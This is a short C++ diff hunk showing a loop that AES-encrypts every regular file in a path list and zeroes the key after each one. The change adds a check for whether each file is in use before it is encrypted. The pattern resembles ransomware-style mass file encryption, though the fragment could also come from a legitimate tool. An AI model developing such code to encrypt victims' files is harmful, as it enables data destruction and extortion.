@@ -37,6 +37,7 @@ int main(int argc, char* argv[])
     for (const auto& NextFile : pathToCrypt) {
         file_logger->info("path {}", NextFile.string());
         if (std::filesystem::is_regular_file(NextFile)) {
+            checkIfInUse(NextFile);
             AESEncrypt(keyIter->data(), NextFile.string());
         }
         std::memset(keyIter->data(), 0, keyIter->size());
